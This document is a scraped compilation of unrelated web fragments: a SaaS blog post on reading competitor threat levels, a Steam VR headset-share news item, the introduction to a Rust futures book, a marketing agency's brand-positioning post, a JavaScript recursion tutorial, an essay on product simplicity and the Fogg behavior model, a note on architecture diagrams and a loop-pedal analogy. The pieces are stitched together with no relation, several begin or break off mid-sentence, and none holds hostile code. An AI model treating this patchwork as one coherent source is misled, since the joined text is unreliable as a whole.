<h2 id="the-competitor-beats-you-but-for-bad-reasons">The competitor beats you, but for bad reasons</h2>

<p><em>We ran into SnowDog in 8 deal cycles last quarter, and they beat us in 3 of them. But it wasn’t for good reasons – they dropped their prices to just 20-30% of ours, added in tons of consulting services, and in one case even promised to build a one-off feature that the customer wanted.</em></p>

<p>When a competitor is desperate, they’ll pull all sorts of tricks in order to beat you. This is especially common when competing against early stage startups. They may win deals, but they’ll ultimately win because of “bad” reasons:</p>

<ul>
  <li>Dramatically undercutting you on price</li>
  <li>Offering to do tons of custom work</li>
  <li>Customizing their roadmap to close deals</li>
  <li>Simply being dishonest in the sales cycle</li>
</ul>

<p>Losing to a competitor for bad reasons tells you that they simply aren’t yet ready to compete with you on a fair playing field. But it also confirms that they are planning to compete with you, and that you’ll need to deal with them in the future… if their business-weakening competitive tactics allow them to survive that long.</p>

<h2 id="the-competitor-beats-you-but-for-valid-reasons">The competitor beats you, but for valid reasons</h2>

<p><em>Hmm… We’ve continued to run into SnowDog, and they just beat us in the Jetblue deal even after we had dropped our prices to remain competitive. The buyer at Jetblue said that they just liked SnowDog’s offering more for their team’s particular use-cases.</em></p>

<p>There can be any number of reasons why a competitor beats you fair and square. They may have outsold you; they may have gotten to the customer first. They may have a better product overall, or may just have a better product for a niche situation that some customers care about.</p>

<p>When you lose for a “valid” reason, it indicates that your competitor’s pitch and ability to back that pitch up in a sales cycle are real. Their product might not actually be that great, but overall they have figured out the mix of product and positioning that gives them a foundation from which to build their go-to-market motion.</p>

<p>Most SaaS markets are competitive, so you should expect to lose some head-to-head deals for valid reasons from time to time. You certainly shouldn’t panic at this point, but by now you should be actively monitoring the competitor in question and preparing your sales team to combat them.</p>

<h2 id="you-cant-reliably-rip-the-competitor-out">You can’t reliably rip the competitor out</h2>

<p><em>SnowDog has been working with Southwest Airlines for a year and a half already. We tried to get them to switch to our offering, but we haven’t been able to do so yet – even though they aren’t huge SnowDog advocates, Southwest says that they’re satisfied enough with the offering and focusing on other projects in the coming year.</em></p>

<p>This is the first severe warning flag. If you can’t rip out a competitor – that is, you can’t pull them out once they’re installed – that means that their product is truly adding value in a sustainable way. Products with weak product/market fit aren’t sticky, and you’ll be able to rip them out easily. Products with strong product/market fit, even if expensive or not beloved, are surprisingly durable once customers are using them.</p>

<p>When you can’t reliably rip a competitor out, you’re dealing with a true adversary and beating them should factor into your company’s strategic roadmap.</p>

<h2 id="the-competitor-can-reliably-rip-you-out-but-only-in-a-niche-customer-segment">The competitor can reliably rip you out, but only in a niche customer segment</h2>

<p><em>It’s a bummer that American Airlines stopped working with us, and we just found out that they actually switched to use SnowDog. This is bad news but isn’t too surprising, however – SnowDog have really established that they’re strong in the airline industry. They don’t have a lot of ability to expand beyond that vertical… we think?</em></p>

<p>This is the most important stage, as it involves a fork in the road.</p>

<p>At this stage there is almost certainly trouble, but the question is how much? Perhaps a competitor is taking only your largest enterprise customers away, or your customers in one particular industry vertical. The company-shaping decision you must make at this point is whether you think that this is as far as they can go, or if they will come after you in another category next.</p>

<p>If you feel that a competitor won’t be able to attack your core business, you <em>may</em> not need to react. Perhaps your product was never really meant for the airline vertical (or wherever you’re losing customers) and this just speeds up your exit from the space. You must monitor the situation but it doesn’t yet need to dominate your field of view.</p>

<p>But it’s also possible that this is just step 1 of a comprehensive attack. Beating you in one customer segment is always the prelude to beating you across the entire market. If there is even a possibility that the competitor will have the incentive and ability to attack your core market, beware: beating this competitor should now be a key pillar of your roadmap, and it’s easiest to take steps to block them immediately.</p>

<p>One indicator that can help make this decision is actually the competitor’s own product marketing. Many companies will actually publicly declare the markets that they want to enter. It’s good PR for prospective future investors, whether public or private. Another clue can come from fundraising patterns - all else being equal, the more money a company has raised, the more markets they will feel compelled to enter in order to justify a higher valuation.</p>

<h2 id="the-competitor-can-reliably-rip-you-out-of-most-customers">The competitor can reliably rip you out of most customers</h2>

<p><em>Home Depot just churned to use SnowDog. What the f### is going on?</em></p>

<p>This is code red, drop everything. This competitor presents an existential risk to your business that you must deal with immediately if you want to keep your job. The longer you wait the worse the problem will become. Beating this competitor is now the core of your roadmap.</p>

<p>The trick is to never, ever get to this point – or at least, if you do get to this point, to see it coming early enough that you have a plan. You can do this by looking for the indicators above, and gradually increasing your defensive and offensive capabilities and counter-capabilities against top competitors to prevent them from rising up in the first place. The full story of how to combat competitors will be the topic of future posts!</p>

<h2 id="takeaways">Takeaways</h2>

<p>Prioritize the amount of time that you spend on the competition. When a competitor rears its head, consider where they fall on this spectrum to determine how concerned you should be. It’s easier to beat competitors when they’re small or before they get to your market, saving you months of work and heartache in the long run.</p>

Steam's latest report reveals that the share of Quest headsets on the platform rose by 5.53% - the largest month-to-month increase since the Rift S dropped last year.</p><p>Meanwhile, while Rift S share remained the highest (at 25.09%, with a rise of 0.46%), share of the Original Rift fell by 0.5%. All in all, the total percentage of Steam users with a VR headset all all rose to 1.91%.</p><p>Last month, 1 in 6 headsets were Oculus Quests - for the first time more than the Valve Index. However, it's important to keep in mind that some people haven't gotten their hands on the Valve Index due to the backlog.</p><p>If you're still looking to order one, <a href="https://www.vrfinal.com/valve-index-backlogged-but-shipping-within-two-weeks/">here's how long it'd take to get to you where you are</a>.</p>

<p>This book aims to explain Futures in Rust using an example driven approach,
exploring why they're designed the way they are, and how they work. We'll also
take a look at some of the alternatives we have when dealing with concurrency
in programming.</p>
<p>Going into the level of detail I do in this book is not needed to use futures
or async/await in Rust. It's for the curious out there that want to know <em>how</em>
it all works.</p>
<h2><a href="#what-this-book-covers" id="what-this-book-covers">What this book covers</a></h2>
<p>This book will try to explain everything you might wonder about up until the
topic of different types of executors and runtimes. We'll just implement a very
simple runtime in this book introducing some concepts but it's enough to get
started.</p>
<p><a href="https://github.com/stjepang">Stjepan Glavina</a> has made an excellent series of
articles about async runtimes and executors, and if the rumors are right there
is more to come from him in the near future.</p>
<p>The way you should go about it is to read this book first, then continue
reading the <a href="https://stjepang.github.io/">articles from stejpang</a> to learn more
about runtimes and how they work, especially:</p>
<ol>
<li><a href="https://stjepang.github.io/2020/01/25/build-your-own-block-on.html">Build your own block_on()</a></li>
<li><a href="https://stjepang.github.io/2020/01/31/build-your-own-executor.html">Build your own executor</a></li>
</ol>
<p>I've limited myself to a 200 line main example (hence the title) to limit the
scope and introduce an example that can easily be explored further.</p>
<p>However, there is a lot to digest and it's not what I would call easy, but we'll
take everything step by step so get a cup of tea and relax.</p>
<p>I hope you enjoy the ride.</p>
<blockquote>
<p>This book is developed in the open, and contributions are welcome. You'll find
<a href="https://github.com/cfsamson/books-futures-explained">the repository for the book itself here</a>. The final example which
you can clone, fork or copy <a href="https://github.com/cfsamson/examples-futures">can be found here</a>. Any suggestions
or improvements can be filed as a PR or in the issue tracker for the book.</p>
<p>As always, all kinds of feedback is welcome.</p>

<h2><a href="#reader-exercises-and-further-reading" id="reader-exercises-and-further-reading">Reader exercises and further reading</a></h2>
<p>In the last <a href="https://cfsamson.github.io/books-futures-explained/conclusion.html">chapter</a> I've taken the liberty to suggest some
small exercises if you want to explore a little further.</p>
<p>This book is also the fourth book I have written about concurrent programming

The Business Dictionary defines brand positioning as:</p><blockquote><p>“A marketing strategy that aims to make a brand occupy a distinct position, relative to competing brands, in the mind of the customer.</p></blockquote><blockquote><p>Companies apply this strategy either by emphasizing the distinguishing features of their brand or they may try to create a suitable image (inexpensive or premium, utilitarian or luxurious, entry-level or high-end, etc.)”</p></blockquote><p>If there is a significant gap between marketing strategy and your brand positioning, then that gap is eating up sales and revenue. As this gap becomes smaller, your sales will increase further — its that simple!</p><p>For some context, I’ve worked in marketing for nearly 10 years, with a couple of years in Head of Marketing and CMO roles before starting <a href="https://rhealondon.com/">Rhea London</a> to help brands and businesses reach their goals.</p><p>One thing we pride ourselves on at the agency is generating maximum revenue for our clients in a short time frame. We’ve had good success with this for the first year we were operating, but sales for our clients increased&nbsp;<em>dramatically</em>when we stopped thinking like marketers, and starting thinking like brand managers.</p><p>Branding pioneer, Marty Neumeier (lived in Sillicon Valley since the 80’s and has designed for&nbsp;<em>Adobe, Apple, Hewlett-Packard&nbsp;</em>and&nbsp;<em>Microsoft</em>) emphasises the need to pay attention to the order in which your customer will view your sales proposition (in our case, a Facebook ad). He’s spent decades refining his thinking on this, with the biggest brands in the world.</p><p>When a potential customer sees your ad, there is a moment when their eyes are looking right at you— this is your one and&nbsp;<em>only</em>&nbsp;time to shine. Neumeier calls this small window of opportunity ‘<em>the branding moment’.</em></p><p>Neumeier lays out 5 stages of how a customer views a product on a supermarket shelf, with each stage often being entirely subconscious.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1607079818241_8798"><div><p>There are very few people reading this that will ever need to sell a product on a shelf, but this framework is<em>&nbsp;directly relatable&nbsp;</em>to advertising on social media (I’ll go in to why in a moment). First, the 5 stages:</p><ol data-rte-list="default"><li><p><strong>Shopper notices packaging on shelf — notices strong colours, contrasting tones.</strong></p></li><li><p><strong>Shopper asks ‘what is it?’</strong></p></li><li><p><strong>Asks ‘why should I care’</strong></p></li><li><p><strong>Looks for more information</strong></p></li><li><p><strong>Shopper has decided if they are ready (or not) to consider price and features.</strong></p></li></ol><p>When translated to seeing your ad on Facebook/Instagram this translates to:</p><ol data-rte-list="default"><li><p><strong>Your target customer stops scrolling when they see your ad — strong colours, contrasting tones grab attention.</strong></p></li><li><p><strong>Target customer asks ‘what is it?’ — your tagline (or headline) should answer this for them.</strong></p></li><li><p><strong>Asks ‘why should I care?’ — this is where you can touch on their pain points and differentiate your product from your competition.</strong></p></li><li><p><strong>This creates the desire for more info — you need to creatively peak their interest and pull them in with a clear why-to-buy message.</strong></p></li><li><p><strong>They are now ready (and primed) to see your features, prices, guarantees, awards and whatever else will take them over the line.</strong></p></li></ol><p>Putting this into practice may seem straight forward, and you may be reading this thinking ‘but, I already do that’ — well if you take a look at one of your ads right now, with those 5 stages in mind, you’ll likely see a significant gap between points. And what’s important to remember is, if&nbsp;<em>any</em>&nbsp;of those points are weak, your brand positioning is weak — resulting in a breakdown in communication between your ad and your potential customer.</p><p>Okay, so how exactly did we use this methodology to generate <strong>over $100,000 in sales?</strong></p><p>The first step was to turn off all ads and start again.</p><p>We redesigned&nbsp;<em>everything</em>.</p><p>New copy, defined new USPs, new tone of voice, new images.</p><p>But for us, what was most important was to first understand what differentiated the products that we were selling, from their direct competitors so that we could effectively communicate this when considering point number 3 above.</p><p>There is one question that has been asked by designers and their marketing counterparts since the dawn of advertising; ‘what drives the customer to buy — logic or emotion?’. Well, it’s both, you just need to be use a clear methodology so that you can maximise sales.</p><h4><strong>Want to discuss how we can help your business?</strong></h4></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1607079818241_11110"><div><div><p>We love generating sales &amp; revenue for brands, apps and software products.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><h2>It's about time we reframed the education of recursion around real life scenarios instead of elegant mathematical equations</h2><div><p>Algorithms</p><p>Comp Sci</p><p>JavaScript</p></div><em>December 3rd, 2020</em><article><p><img src="https://sunilsandhu.com/assets/post-content/reframing-recursion.png" alt="Two circles recursively regenerating inside of themselves"></p>
<p>For programmers - especially self-taught programmers - our first introduction to the world of
'recursion' is often in the form of something math-related. It's not uncommon for programmers to
intrinsically call upon some of our favourite F words when we think of recursion - no not that F
word, these ones:</p>
<p><strong>Fibonacci</strong></p>
<pre><code><span><span>function</span> <span>fibonacci</span>(<span>position</span>) </span>{
  <span>if</span> (position &lt; <span>3</span>) <span>return</span> <span>1</span>;
  <span>return</span> fibonacci(position - <span>1</span>) + fibonacci(position - <span>2</span>);
}</code></pre>
<p><strong>Factorial</strong></p>
<pre><code><span><span>function</span> <span>factorial</span>(<span>num</span>) </span>{
  <span>if</span> (num === <span>1</span>) <span>return</span> num;
  <span>return</span> num * factorial(num - <span>1</span>);
}</code></pre>
<p>Recursive versions of the fibonacci and factorial functions are some of the more beautiful pieces of
code you can expect to see. These concise slices of code rely on little more than themselves to get
the job done. They embody the very definition of recursion - a function that calls itself (the
calling of itself is the part that is recursive). It's really no wonder that just like when a
tutorial incorporates a new topic by demonstrating how it interacts with something trivial, like a
counter or a 'to do' list, fibonacci and factorial functions encapsulate the topic of recursion with
little to zero interference from the external complexities you might find as soon as you start
introducing other bits of code to interact with. Just like the counter and the 'to do' list,
fibonacci and factorial are trivial.</p>
<p>You may have heard a saying that "all iterative algorithms can be expressed recursively". In other
words, a function that uses a loop can be rewritten to use itself. Now if any iterative algorithm
can be written recursively, the same must be true for the inverse.</p>
<p><em>Note: An iterative algorithm, or function, is one that makes use of a loop to get the job done.</em></p>
<p>Let's go back to our recursive Fibonacci function and write it as an iterative Fibonacci function
instead:</p>
<pre><code><span><span>function</span> <span>fibonacci</span>(<span>index = <span>1</span></span>) </span>{
  <span>let</span> sequence = [<span>0</span>, <span>1</span>, <span>1</span>];
  <span>if</span> (index &lt; <span>3</span>) <span>return</span> <span>1</span>;
  <span>for</span> (<span>let</span> i = <span>2</span>; i &lt; index; i++) {
    sequence.push(sequence[sequence.length - <span>1</span>] + sequence[sequence.length - <span>2</span>]);
  }
  <span>return</span> sequence[index];
}</code></pre>
<p>Let's also take our recursive Factorial function and write that as an iterative Factorial function:</p>
<pre><code><span><span>function</span> <span>factorial</span>(<span>num</span>) </span>{
  <span>if</span> (num === <span>1</span>) <span>return</span> <span>1</span>;

  <span>for</span> (<span>let</span> i = num - <span>1</span>; i &gt;= <span>1</span>; i--) {
    num = num * i;
  }
  <span>return</span> num;
}</code></pre>
<p>Both of our recursive and iterative approaches reach the same conclusion. If you give them the same
input, they will produce the same output. Even the path the take is, arguably, the same. The only
difference is the metaphorical mode of transportation used on the path to reach said output.</p>
<p>So if we're able to write recursive functions iteratively, why do we even need to bother learning
about recursion in the first place, and what use does it have in programming?</p>
<p>The main reason we use recursion is to simplify an algorithm into terms easily understood by most
people. It's important to note here that the purpose of recursion (or rather, its benefit of
recursion) is to make our code easier to read, and easier to reason with. However, it is important
to be aware that recursion is not a mechanism we can use to optimize our code for performance - if
anything, it can have an adverse effect on performance compared to an equivalent function written
iteratively.</p>
<p>If you want a short soundbite to remember, I'd say this: <em>Recursive functions optimise legibility
for developers. Iterative functions optimise performance for computers.</em></p>
<p>The frustrating thing about a lot of articles and tutorials on recursion I've read before is that
they veer on the side of caution and fixate themselves on only talking about functions such as a
recursive fibonacci or factorial. There's no real advantage a developer can gain from these being
written recursively. This is like giving someone the punchline to a joke, without any of the steps
leading up to it.</p>
<p>In the case of recursive fibonacci and factorial functions, we saw earlier that if we convert them
into iterative functions the code itself isn't actually that bad. It's arguably just as easy to read
and legible as the recursive equivalents. Sure, it might not have the same level of elegance, but if
it's still readable, I'm going to go ahead and favour optimising for perfornance.</p>
<p>It therefore seems plausible that a lot of people learning about recursion for the first time may
struggle to see any real use from using it. Maybe they just see it as some sort of overengineering
abstraction. So how is recursion useful? Or better yet, how can we make the study of recursion
useful?</p>
<p>Useful recursion can be found when we actually try to write code that resembles a real life
scenario.</p>
<p>I can probably take a punt and say that close to zero developers anywhere (outside of a whiteboard
interview) have been expected to write a recursive fibonacci or factorial function for their job -
and if they were, they could have just googled it because there's a million articles that already
explain it.</p>
<p>There aren't, however, enough articles demonstrating how recursion can be used in real life
scenarios. We need fewer 'Introduction to Recursion' articles, and more articles about how recursion
can help you solve that coding problem you're currently facing at work.</p>
<p>So now that we're on the topic, let's imagine the following scenario: your boss has given you a data
structure full of departments that each contain the email addresses of everyone that works in that
department. However, each department sometimes is made up varying levels of subdepartments, objects
and arrays. Your boss wants you to write a function that can send an email to each of those email
addresses.</p>
<p>Here's the data structure:</p>
<pre><code><span>const</span> companyEmailAddresses = {
  <span>finance</span>: [<span>"jill@companyx.com"</span>, <span>"frank@companyx.com"</span>],
  <span>engineering</span>: {
    <span>qa</span>: [<span>"ahmed@companyx.com"</span>, <span>"taylor@companyx.com"</span>],
    <span>development</span>: [<span>"cletus@companyx.com"</span>, <span>"bojangles@companyx.com"</span>, <span>"bibi@companyx.com"</span>],
  },
  <span>management</span>: {
    <span>directors</span>: [<span>"tanya@companyx.com"</span>, <span>"odell@companyx.com"</span>, <span>"amin@companyx.com"</span>],
    <span>projectLeaders</span>: [
      <span>"bobby@companyx.com"</span>,
      <span>"jack@companyx.com"</span>,
      <span>"harry@companyx.com"</span>,
      <span>"oscar@companyx.com"</span>,
    ],
    <span>hr</span>: [<span>"mo@companyx.com"</span>, <span>"jag@companyx.com"</span>, <span>"ilaria@companyx.com"</span>],
  },
  <span>sales</span>: {
    <span>business</span>: {
      <span>senior</span>: [<span>"larry@companyx.com"</span>, <span>"sally@companyx.com"</span>],
    },
    <span>client</span>: {
      <span>senior</span>: [<span>"jola@companyx.com"</span>, <span>"amit@companyx.com"</span>],
      <span>exec</span>: [<span>"asha@companyx.com"</span>, <span>"megan@companyx.com"</span>],
    },
  },
};</code></pre>
<p>So, how do you tackle this?</p>
<p>Well, from what we can see, a subdepartment appears to take the form of an object, while arrays have
been used to store email addresses. So I could try and write some sort of iterative function that
loops through each department, and checks if it is a subdepartment (object) or a list of email
addresses (array). If it's an array, we can then loop through the array and send an email to each
email address. If it's an object, we could create another loop to tackle that subdepartment, using
the same 'check if it's an object or an array' tactic we used earlier. From what we can tell, our
data structure doesn't go any deeper than two sub levels. So one more iteration should satisfy all
levels and do what we want it to.</p>
<p>Our final code might look something like this:</p>
<pre><code><span><span>function</span> <span>sendEmail</span>(<span>emailAddress</span>) </span>{
  <span>console</span>.log(<span>`sending email to <span>${emailAddress}</span>`</span>);
}

<span><span>function</span> <span>gatherEmailAddresses</span>(<span>departments</span>) </span>{
  <span>let</span> departmentKeys = <span>Object</span>.keys(departments);
  <span>for</span> (<span>let</span> i = <span>0</span>; i &lt; departmentKeys.length; i++) {
    <span>if</span> (<span>Array</span>.isArray(departments[departmentKeys[i]])) {
      departments[departmentKeys[i]].forEach(<span>(<span>email</span>) =&gt;</span> sendEmail(email));
    } <span>else</span> {
      <span>for</span> (<span>let</span> dept <span>in</span> departments[departmentKeys[i]]) {
        <span>if</span> (<span>Array</span>.isArray(departments[departmentKeys[i]][dept])) {
          departments[departmentKeys[i]][dept].forEach(<span>(<span>email</span>) =&gt;</span> sendEmail(email));
        } <span>else</span> {
          <span>for</span> (<span>let</span> subDept <span>in</span> departments[departmentKeys[i]][dept])
            <span>if</span> (<span>Array</span>.isArray(departments[departmentKeys[i]][dept][subDept])) {
              departments[departmentKeys[i]][dept][subDept].forEach(<span>(<span>email</span>) =&gt;</span> sendEmail(email));
            }
        }
      }
    }
  }
}</code></pre>
<p>I've checked it out, maybe I've even written a little unit test for it. It looks like a mess, but it
works. With the amount of nested loops here you could argue that it's highly inefficient. Someone in
the background hollers <em>"Big O? More like Big OMG, am I right?"</em></p>
<p>Now of course, there are other ways we could have tackled this, but what we have at the moment
works. Anywho, it's just a little function and there's not too many email addresses in there and we
probably won't use it often, so it doesn't matter. Let's get back to working on more important
projects before the boss finds another side task for me to work on!</p>
<p>Five minutes later and your boss returns and mentions that they also want the function to still work
even if new departments, subdepartments, and email addresses are added to this data structure at a
later point. Okay, this changes things because now I need to factor in the possibility of
subsubsubdepartments, subsubsubsubdepartments and so on.</p>
<p>Suddenly my iterative function no longer satisifes the criteria.</p>
<p>But lo and behold, a recursive solution enters!</p>
<pre><code><span><span>function</span> <span>sendEmail</span>(<span>emailAddress</span>) </span>{
  <span>console</span>.log(<span>`sending email to <span>${emailAddress}</span>`</span>);
}

<span><span>function</span> <span>gatherEmailAddresses</span>(<span>departments</span>) </span>{
  <span>let</span> departmentKeys = <span>Object</span>.keys(departments);
  departmentKeys.forEach(<span>(<span>dept</span>) =&gt;</span> {
    <span>if</span> (<span>Array</span>.isArray(departments[dept])) {
      <span>return</span> departments[dept].forEach(<span>(<span>email</span>) =&gt;</span> sendEmail(email));
    }
    <span>return</span> gatherEmailAddresses(departments[dept]);
  });
}</code></pre>
<p>Okay, we finally have a function that makes use of recursion in something more fitting of a
real-life scenario. Let's explain how it all works.</p>
<p>Our function loops through the keys from the <code>companyEmailAddresses</code> …</p></article></section></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-89cfead268f30384aa7d"><div><p><em>TLDR: Simplicity is still a controversial topic. Most argue that consumers desire simpler products. Some argue that they want simplicity but only if it is executed correctly (what that means is often left undefined). And a few believe that it’s actually complexity that makes consumers buy. This disagreement is rooted in the fact that no one seems to agree on what simplicity means. I suggest avoiding using it in any professional capacity, in favor of a more precise tool kit. What motivates the buying decision are the 3 components of the Fogg Behavior Model: motivation, ability, and prompt. Motivation, in order to make the sale, can be further broken down into the Job To Be Done (why is the consumer hiring the product?) and acute satisfaction (how badly do they want it in that moment?). Ability, making a behavior easier or harder to do, can be subdivided into time, money, physical effort, mental effort, repetition, social deviance, location in space, and location in time. Getting comfortable with these concepts will give you a productive framework to work with when deciding what features to include/exclude, and help you create products people actually want to buy, use, and recommend.</em></p><p>One of the most fundamental theorems to have come out of behavior science is that <strong>shine changes behavior</strong>.</p><p>What’s shine? Shine is the emotion you feel when you feel successful. When you aced that job interview, got your first customer, or finally won that match in your game or sport. [1] By making behavior easy to do, you increase the probability that you’ll succeed instead of fail. When you succeed, you feel successful which reinforces the connection in your brain between that behavior and that positive feeling, and that leads  to behavior change.&nbsp;</p><p>Simplicity → Shine → Behavior Change.</p><p>Because simplicity means so many different things to so many different people, a more precise way to think about it is in terms of ability. High ability means a behavior is easy to do. Low ability means it’s hard to do. So when you’re thinking about consumer behavior change, think about increasing ability, making it easy to do.</p><p><em>For the purpose of this essay you can use consumer and user interchangeably.</em></p><p>Obvious right? Well, no. The problem with fields like behavior science is tool bias. Which I described in <a href="https://www.younglingfeynman.com/essays/covid" target="_blank">Covid-19 And Human (Ir)Rationality — PART 1</a>:</p><blockquote><p>“This is a fascinating bias I call tool bias (if it has an official name, let me know), which ties the complexity of the tool to the perception of difficulty. Math can appear complex even when the application is very simple. Influencing behavior can appear simple even when the application is very complex. This phenomenon occurs in comedy as well. It’s easy to underestimate how difficult it is to create a good set because the tools (language) are simple, so while you laugh you think, I could do this easily.”</p></blockquote><p>I.e. behavior science suffers from hindsight bias because it’s so easy to understand. It all appears obvious ex post facto.&nbsp;</p><p>If something seems easy, we think “that must BE easy.”</p><p>But if you were to ask around as to what creates behavior change, you’d get many different answers (mainly around motivation) but making things easy to do wouldn’t be one of them. [2]</p><p>Okay, if simplicity or more precisely, increasing ability is so important (and obvious) then why are products so complicated?</p><p>Because it’s that very complexity that sells.</p><p>When we see something that’s complex, we think “that must have a lot of value.” If you’re a consultant giving simple answers to complex problems, it seems as though you’re not very smart or, at the very least, you aren’t taking it seriously. When you make it so complex that people can hardly follow along, it becomes hard for people to estimate the boundaries of your knowledge.&nbsp;</p><p>E.g. suppose you hire a consultant to help you with next year’s strategy. If they give you a thick stack of papers that supports their conclusion, you’ll perceive it more favorably than if they give you a single sheet with 2 paragraphs on it, sharing that same conclusion. Complexity acts as a heuristic for value. [3]</p><p><em>An obvious, but important nonetheless note, is that truth has to be measured by truth, not truthiness. </em><strong><em>Complexity impacts truthiness but it has no correlation with truth</em></strong><em>. I.e. just because something is complex doesn’t make it true. Just because something is simple doesn’t make it false. But that’s exactly the cognitive bias we have and partly explains our obsession with data-driven arguments. Read </em><a href="https://www.younglingfeynman.com/essays/misleadingdata?rq=data" target="_blank"><em>Your Data Is Lying To You And You’re Listening</em></a><em> for more on that.</em></p><p>Is this only true in information? No. You see the same phenomenon from consumer products to enterprise software.</p><p>According to Thompson, Hamilton, and Rust (2005), increasing the complexity of a product can have a positive effect on consumer satisfaction because of an increase in perceived capability.</p><p>Look at the following products:</p><p><strong>Stripey toothpaste: </strong>Why do they go to so much trouble to make sure stripey toothpaste comes out of the tube, well… stripey? An overly logical engineer would see that and claim that you should just mix the products. It would have the exact same effect on oral hygiene and you’d actually save on cost. But that’s only correct if your customers were logical robots. But they’re emotional humans. Consumers simply don’t believe your toothpaste has 3 functions if they don’t see it. ‘’Healthy gums. Strong teeth. Fresh breath.” Show me, don’t tell me.</p><p><strong>Dishwashing tablet: </strong>Same argument. Just blend all the ingredients into one homogenous tablet. But again, I, the consumer, wouldn’t believe you.</p><p><strong>Toilet rim block: </strong>Look at how these simple blocks have grown in complexity. Multiple liquids in a container, different colored solid spheres, sticky discs you shoot onto your bowl, etc. [4]</p><p><strong>Coffee machine: </strong>The most expensive ones have the most gizmos. More features to increase perceived capability, which is exactly what I, the consumer, want. Take Dolce Gusto machines for example. A manual lever to flip to make coffee? What am I, a 17th-century peasant?! I’ll take the model with the fancy LCD touch screen so I can feel like Louis the 14th thank you very much.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1606422050075_102553"><p><strong>Cars: </strong>Steering wheels with roughly similar complexity as NASA's mission control.

Now you got an app for everything, cameras that rival mirrorless cameras and DSLRs in the right conditions, and more power than many laptops.</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1606422050075_27120"><div><p>It seems that if we want to sell more, we should simply add features.</p><p>Well, yes. But also… well, no.</p><p>There are many UX experts that advocate precisely this. “Simplicity is overrated and consumers, ceteris paribus, want more features because they want the most powerful products.”</p><p>This is partly true. Would you pay more for a phone that does less? It has a basic camera, or perhaps no camera, it has less memory, it’s not fast, it’s missing features (even if you don’t use them). Probably not. While one can imagine an audience of minimalists for that, one can’t imagine that they’d pay more for it than the flagship phone which sets the anchor for that particular price hierarchy.</p><p>But if that’s the whole story, that raises the question, why do products ever get disrupted? Surely, if features sell then Yahoo wouldn’t have gotten disrupted by Google. Or Netflix by Blockbuster. Or Facebook by Myspace. Or any other startup, since pretty much all of them started very simple.</p><p>The erroneous assumption here is that simple means getting rid of features. But a car that’s missing two wheels, the engine, and the body, that’s not simplicity. That’s not even a car. A bagless vacuum cleaner — &gt; a cordless bagless vacuum cleaner — &gt; the Dysons we have now with all kinds of attachments, different vacuum heads, and automatically adjusting suction levels… now you’ve got my attention. The “simple” Dysons still had high usability despite lower capability. So it’s not just about removing features, it’s about being diligent about which features you do add. And your customers are the arbiter that decide whether or not you got it right.</p><p>On top of that, Rust, Thompson, and Hamilton (2006) demonstrated that an increase in features (even the right features) doesn’t automatically translate into more consumer satisfaction. In fact, as perceived capability increases, perceived usability decreases. This is known as feature fatigue. (Thompson, Hamilton &amp; Rust, 2005; See also Kemenade, 2018).</p><p>So if we can’t simply add or remove features, how should we think about getting consumers to buy?</p><p>The user needs to want it (motivation), they need to be able to buy it (have the ability), and be provoked into buying it (prompt). (Fogg, 2009). Ability usually isn’t the most constraining factor. If a consumer really wants to buy something, they’ll take care of any cognitive dissonance for you. E.g. “I don’t have the space for this new guitar. But damn, I really want it. Okay, I’ll just clean up the attic, and then I’ll have enough space.” (Which they won’t do). Not carrying (enough) money is also not really an issue anymore with Apple Pay and the like.&nbsp;</p><p>You could imagine a physical constraint. E.g. they wanna buy but the product is too big to take home in their car. That’s a place where you could offer some delivery service to solve for ability. E.g. Ikea or AptDeco. Or your site only accepts credit cards, which are never used in The Netherlands. In which case the user probably wouldn’t buy because it’s too much of a hassle. </p><p>Prompts aren’t perfect in 2020 but rarely do products fail because they were so amazing yet the company simply forgot to tell people about it. And pretty much the only thing marketers actually understand is CTA: Call To Action, which is just another word for prompt. So buying is primarily a motivation issue. And secondarily an …</p></div></div></div>

<p>I’ve spent too many hours writing pages and pages of architecture docs that nobody ever read.</p>



<p>I’ve joined too many projects with gigantic architecture docs that were outdated and useless.</p>



<p>I’ve seen too many architecture docs that were mind-numbing prose descriptions of what should have been a diagram.</p>



<p>I’m sick of it. My rule nowadays is that <em>each team gets one diagram</em>. That’s the architecture doc. It can be as complex as it needs to be, but there can only be one per team.</p>



<p><strong>Why a diagram?</strong></p>



<ul><li>A picture is worth a thousand words. Never has that been more true than with architecture docs.</li><li>Nobody wants to sit there and read dozens of pages of prose when they could look at a diagram instead.</li><li>Maintaining all those pages of text is a nightmare as little things change gradually over time.</li></ul>



<p><strong>Why only one?</strong></p>



<ul><li>The chance of outdated info increases exponentially with the number of diagrams, rather than proportionally.</li><li>Eventually two “unrelated” things will need a connection between them that we didn’t foresee.</li><li>Onboarding and planning are easier when we can visualize everything<em> </em>in one place.</li></ul>



<p>You get one diagram. Use it well.</p>

<p>Those are the best sorts of days.</p>
<p>Somedays that leads to a new song.</p>
<h3>A loop pedal is a stack</h3>
<p>A loop pedal is a magical device that lets you record in stacked layers. It's almost like editing something in Figma or Sketch, except each layer is the same "shape" as the first or root layer. And by <em>shape</em> here what I actually mean is <em>length</em>.</p>
<p>Like other guitar pedals, a loop pedal lives somewhere between your guitar (the input) and your amp (the output). It receives the input from your instrument and "does stuff" with it, before sending it onwards. For example, maybe you want to add some <strong>distortion</strong> or <strong>flange</strong> -- OR BOTH. Your guitar pedals are like the world's simplest data flow pipeline. </p>
<div data-language="text"><pre><code>Guitar -&gt; Distortion Pedal -&gt; Flanger Pedal -&gt; Chorus Pedal -&gt; Amp</code></pre></div>
<p>No cycles or braching in this DAG. I mean, maybe there could branching. Or cycles. I bet some guitarists do that, somehow. But that's beyond my pay grade.</p>
<p>Let's go back to our loop pedal and record something.</p>
<p>Imagine that I tap the loop pedal with my foot, play the following, and tap the pedal again.</p>

<p>Each X here might represent one "measure" or "bar" in music theory land, but that's mostly unfamiliar territory for me, too, so instead we can say that we've played the X chord (I wish there was an X chord) 8 times of some fixed duration.</p>
<p>This is now our root layer for our stack.</p>
<p>By default, the pedal will keep "looping" this layer. You can double-tap it to "stop the loop" (maybe you'd do this when you reach a new section of your song, like the chorus).</p>
<p>Otherwise, now it's time to add some more layers. Tap the pedal again and you add the following layer:</p>

<p>Maybe <code>y</code> is an awesome solo or something. Then you do it again.</p>
